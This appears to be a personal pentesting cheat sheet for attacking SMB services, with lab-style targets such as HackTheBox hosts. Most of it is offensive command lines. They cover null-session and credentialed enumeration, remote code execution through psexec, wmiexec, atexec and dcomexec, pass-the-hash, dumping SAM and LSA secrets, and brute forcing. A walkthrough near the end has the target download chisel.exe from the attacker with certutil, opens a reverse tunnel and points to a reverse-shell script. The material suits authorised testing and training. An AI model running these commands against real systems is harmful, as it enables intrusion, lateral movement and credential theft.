# 139,445 - Pentesting SMB

	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds

	
	
The below command is an example of how enum4linux might be used to perform a full enumeration against a target specified by target_ip.	
		
	enum4linux -a target_ip

➜  Administrator smbclient -L 10.10.11.42 -U Olivia

Password for [WORKGROUP\Olivia]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

IPC$ Share
Access to the IPC$ share can be obtained through an anonymous null session, allowing for interaction with services exposed via named pipes. The utility enum4linux is useful for this purpose

# SMB server version
To look for possible exploits to the SMB version it important to know which version is being used. If this information does not appear in other used tools, you can:

	Use the MSF auxiliary module _auxiliary/scanner/smb/smb_version
	
	
	
Search exploit

	msf> search type:exploit platform:windows target:2008 smb
	searchsploit microsoft smb

Access to the IPC$ share can be obtained through an anonymous null session, allowing for interaction with services exposed via named pipes.



SMB Environment Information
Obtain Information

	#Dump interesting information
	enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
	enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
	nmap --script "safe or smb-enum-*" -p 445 <IP>

	#Connect to the rpc
	rpcclient -U "" -N <IP> #No creds
	rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
	rpcclient -U "username%passwd" <IP> #With creds
	#You can use querydispinfo and enumdomusers to query user information

	#Dump user information
	/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
	/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

	#Map possible RPC endpoints
	/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
	/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
	/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

To enumerate shared SMB folders, 

	crackmapexec smb -u '<username>' -p '<password>' --shares <domainName>
	
	
Enumerate Users, Groups & Logged On Users
This info should already being gathered from enum4linux and enum4linux-ng

	crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
	crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
	crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

	ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

	rpcclient -U "" -N 10.10.10.10
	enumdomusers
	enumdomgroups

	
Enumerate local users
Impacket: Impacket: https://github.com/fortra/impacket/blob/master/examples/lookupsid.py


	lookupsid.py -no-pass hostname.local

Metasploit - Enumerate local users

	use auxiliary/scanner/smb/smb_lookupsid
	set rhosts hostname.local
	run
	
	
GUI connection from linux
In the terminal:
	
	xdg-open smb://cascade.htb/

In file browser window (nautilus, thunar, etc)
	
	smb://friendzone.htb/general/
	
	
	
List shared folders
It is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.


	smbclient --no-pass -L //<IP> # Null user
	smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

	smbmap -H <IP> [-P <PORT>] #Null user
	smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
	smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
	smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

	crackmapexec smb <IP> -u '' -p '' --shares #Null user
	crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
	crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
		
		
Connect/List a shared folder

	#Connect using smbclient
	smbclient --no-pass //<IP>/<Folder>
	smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
	#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

	#List with smbmap, without folder it list everything
	smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
	smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
	smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash		
			
		
		
	
Authenticate using Kerberos
You can authenticate to kerberos using the tools smbclient and rpcclient:

	smbclient --kerberos //ws01win10.domain.com/C$
	rpcclient -k ws01win10.domain.com	
		
		
	
Execute Commands
crackmapexec
crackmapexec can execute commands abusing any of mmcexec, smbexec, atexec, wmiexec being wmiexec the default method. You can indicate which option you prefer to use with the parameter --exec-method:

	apt-get install crackmapexec

	crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
	crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
	crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
	# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

	crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash	
		
		
		
	
psexec/smbexec
Both options will create a new service (using \pipe\svcctl via SMB) in the victim machine and use it to execute something (psexec will upload an executable file to ADMIN$ share and smbexec will point to cmd.exe/powershell.exe and put in the arguments the payload --file-less technique--).
More info about psexec and smbexec.
In kali it is located on /usr/share/doc/python3-impacket/examples/


	#If no password is provided, it will be prompted
	./psexec.py [[domain/]username[:password]@]<targetName or address>
	./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
	psexec \\192.168.122.66 -u Administrator -p 123456Ww
	psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
Using parameter-k you can authenticate against kerberos instead of NTLM

wmiexec/dcomexec
Stealthily execute a command shell without touching the disk or running a new service using DCOM via port 135.
In kali it is located on /usr/share/doc/python3-impacket/examples/

#If no password is provided, it will be prompted
	
	./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
	./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash

#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
Using parameter-k you can authenticate against kerberos instead of NTLM


#If no password is provided, it will be prompted
	
	./dcomexec.py [[domain/]username[:password]@]<targetName or address>
	./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted

AtExec
Execute commands via the Task Scheduler (using \pipe\atsvc via SMB).
In kali it is located on /usr/share/doc/python3-impacket/examples/


	./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
	./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
Impacket reference
https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/

Bruteforce users credentials
This is not recommended, you could block an account if you exceed the maximum allowed tries

nmap --script smb-brute -p 445 <IP>
	
	ridenum.py <IP> 500 50000 /root/passwds.txt 
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
We need to find a way to connect to the DC. Let's try to enumerate with BloodHound.

	bloodhound-python -u '<username>' -p '<password>' --dc <commonName> -d <domainName> -c all -ns <TARGET>
	
Try to  execute commands on the machine remotely using the DCOM (Distributed Component Object Model) protocol. Try test it with ping back my Kali machine:

	impacket-dcomexec '<domainName>/<username>:<password>@<commonName' 'ping -n <IP>' -nooutput -object MMC20 -dc-ip <TARGET>

Listen on your machine for any incoming packets
	
	sudo tcpdump -i tun0 icmp
 
If it works send the command to finally obtain a reverse shell on the macine. To send our command to obtain the reverse shell,  used this handy Python script that encrypts your payload in base64 and then executes it directly from the compromised machine using PowerShell.

	https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58

Once in the machine  see if we you find any others running locally and are in listening Model.

		netstat -ano | findstr '127.0.0.1:'
There's a handy tool for this, Chisel. It needs to be installed on our Kali and for the target machine, simply uploading the executable .exe is enough.

	https://github.com/jpillora/chisel
	
On target machine
	
	certutil -urlcache -f http://<IP>/chisel.exe chisel.exe
	
	/chisel.exe client <IP>:<PORT> R:<servicePort>:127.0.0.1:<servicePort>
	
On attack machine
		
	chisel server -p <PORT> --reverse
Now you can use your browser and see what it's all about. You will find the login screen for Openfire Administration Console and  even have its version




















SMB
Server Message Block

Check for SMB vulnerablities with Nmap:


	sudo nmap -sV --script-args=unsafe=1 --script smb-os-discovery 10.10.13.37 -p139,445
	sudo nmap -n -Pn -sV --script 'smb-vuln*' 10.10.13.37 -p445
Check if SMB Signing is enabled with CME:


	cme smb smb.txt | grep -a 'signing:False'

	
# Hunt for Shares & Content
https://github.com/blacklanternsecurity/MANSPIDER

https://github.com/SnaffCon/Snaffler

https://github.com/mitchmoser/SharpShares

https://github.com/punk-security/SMBeagle

https://github.com/p0dalirius/FindUncommonShares



Tools
rpcclient
Check for null authentication:

	rpcclient -N -L 127.0.0.1
With user creds:

	rpcclient -U 'snovvcrash%Passw0rd!' 127.0.0.1
smbclient
Check for null authentication:

	smbclient -N -L 127.0.0.1
	smbclient -N '\\127.0.0.1\Data'
With user creds:

	smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
Get all files recursively:


	smb: \> recurse ON
	smb: \> prompt OFF
	smb: \> mget *

smbmap
	
	smbmap -H 127.0.0.1
	smbmap -H 127.0.0.1 -u anonymous
	smbmap -H 127.0.0.1 -u '' -p ''
	smbmap -H 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -R ShareName
	smbmap -H 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -R ShareName -A .
